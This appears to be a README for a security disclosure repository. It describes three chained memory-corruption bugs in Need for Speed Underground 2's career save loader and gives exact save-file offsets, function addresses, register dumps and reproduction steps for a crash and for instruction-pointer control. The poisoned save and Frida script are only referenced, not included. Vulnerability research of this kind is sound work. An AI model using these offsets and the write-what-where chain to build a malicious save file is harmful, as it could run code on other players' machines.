# NFS Underground 2 — Save File Arbitrary Code Execution

Three memory corruption vulnerabilities in the Need for Speed Underground 2 career save deserializer that chain together for **full EIP control** from a crafted save file.

| | |
|---|---|
| **Product** | Need for Speed Underground 2 (SPEED2.EXE) |
| **Version** | PC (Windows) |
| **Vendor** | Electronic Arts |
| **Platform** | Windows x86 (32-bit PE) |
| **Severity** | High (CVSS 3.1: 7.8 — AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H) |
| **Attack vector** | Crafted career save file |
| **Impact** | Arbitrary code execution |
| **Date** | November 2026 |

## Overview

The career save file loader in NFS Underground 2 copies 54,930 bytes of attacker-controlled data directly into a global struct with no validation beyond a magic number and version check. No hash, no signature, no bounds checking. Several fields from this payload are then used as raw pointer operands and array indices in the deserialization code, producing multiple exploitable memory corruption primitives.

The binary ships with no ASLR (fixed base `0x00400000`), no stack cookies, no DEP, and all addresses are deterministic across every installation. The save file format has no integrity protection whatsoever.

## Proven Exploitation Paths

### Path 1: Save File Only (No Instrumentation)

A single 4-byte modification to a career save file crashes the game on load with attacker-controlled register state. No tools, no hooks, no instrumentation required.

```
Save file (offset 0xc573) = 41 41 41 41
    │
    ▼
Deinterleave → career struct field +0x8c = 0x41414141
    │
    ▼
FUN_005344e0 loads career+0x8c as array index (EAX)
    │
    ▼
MOV ECX, [EBP + EAX*4 - 0x24]    ← OOB access, EAX = 0x41414141
    │
    ▼
ACCESS VIOLATION at 0x5346d7
    EAX = 0x41414141  (save-controlled)
```

**This crash is reproducible and deterministic.** The crafted save file is included at [`poc/crash_minimal.bin`](poc/crash_minimal.bin).

### Path 2: Instrumented Chain (Full EIP Control)

With Frida instrumentation, the Vuln 2 → Vuln 3 chain achieves complete instruction pointer control:

```
Vuln 2 fires (FUN_004792b0)
    *(*(ECX+0x98) + 0x14) = param_1
    Write-what-where: fake object ptr → DAT_0082b974
    │
    ▼
Vuln 3 fires (FUN_00469050)
    MOV ECX, [0x0082b974]     ← now points to fake object in career struct
    MOV EAX, [ECX]            ← fake vtable (self-referencing pointer)
    CALL [EAX + 0x14]         ← attacker-controlled function pointer
    │
    ▼
EIP = 0x41414141   ✓ Full control
```

## Proof

### Save-triggered crash (Path 1)

Captured via Frida exception handler after loading [`poc/crash_minimal.bin`](poc/crash_minimal.bin):

```
Exception:    access-violation
Fault addr:   0x5346d7

EIP = 0x5346d7    (faulting instruction in deserializer)
EAX = 0x41414141  ← SAVE FILE DATA (4 bytes at file offset 0xc573)
EBX = 0x83aa28    ← career struct + 0x48
EDI = 0x83aa6c    ← career struct + 0x8c (OOB index source)

Faulting:  MOV ECX, [EBP + 0x41414141*4 - 0x24]
           OOB read at +0x05050504 from stack frame
```

### Instrumented EIP control (Path 2)

```
EIP = 0x41414141  ← INSTRUCTION POINTER CONTROLLED
EAX = 0x0083ace0    (fake object in career struct)
ECX = 0x0083ace0
ESP = 0x001afc6c
EBP = 0x001afcac
```

## Memory Corruption Without Crash

Even when the game does not crash, save file data provably corrupts live game objects. Setting career+0x70 to `0xDEADBEEF` in the save file causes the write-what-where primitive to plant `0xDEADBEEF` into the audio manager's internal struct during deserialization:

```
career+0x70 = 0xDEADBEEF         (from save file offset 0xc547)
*(audio_mgr+0x98)+0x14 = 0xDEADBEEF   (written by FUN_004792b0)
```

No crash, no Frida hooks — the corruption happens through the game's own code path.

## Repository Contents

```
├── DISCLOSURE.md              Full technical write-up
├── poc/
│   ├── crash_minimal.bin      Crafted save file (4-byte patch, crashes on load)
│   ├── eip_control.js         Frida PoC script (full EIP control)
│   └── README.md              Reproduction steps
├── reference/
│   └── save-format.md         Save file format documentation
├── samples/
│   └── career.bin             Clean career save (format reference)
└── LICENSE
```

## Reproduction

### Save-triggered crash (no tools needed)

1. Copy `poc/crash_minimal.bin` to `%LOCALAPPDATA%\NFS Underground 2\<Profile>\<Profile>`
2. Launch the game and load that profile
3. Game crashes immediately — access violation in the deserializer

### Full EIP control (with Frida)

1. Launch `SPEED2.EXE`
2. Attach Frida: `frida -p <PID> -l poc/eip_control.js`
3. Load any career profile
4. Observe: `EIP = 0x41414141`

See [`poc/README.md`](poc/README.md) for detailed steps.

## Vulnerabilities

| ID | Function | Address | Type | Severity |
|----|----------|---------|------|----------|
| Vuln 1 | `FUN_005344e0` | `0x5346d5` | OOB array index (CWE-787) | High |
| Vuln 2 | `FUN_004792b0` | `0x4792b0` | Arbitrary write-what-where (CWE-123) | Critical |
| Vuln 3 | `FUN_00469050` | `0x469050` | Vtable hijack → code exec (CWE-843) | Critical |

## Tools Used

- [Ghidra](https://ghidra-sre.org/) 12.1.4 (via REA) — static analysis, decompilation
- [Frida](https://frida.re/) — dynamic instrumentation, runtime proof

## Disclaimer

This research is published for **educational and defensive purposes only**. The vulnerabilities exist in a 22-year-old game with no active security support. No weaponized exploit (shellcode, payload delivery) is included. The PoC demonstrates control of the instruction pointer and nothing more.

Do not use this research to harm other players. Don't be that person.

## License

Research scripts and documentation are released under the [MIT License](LICENSE). The game binary and its assets remain the property of Electronic Arts.
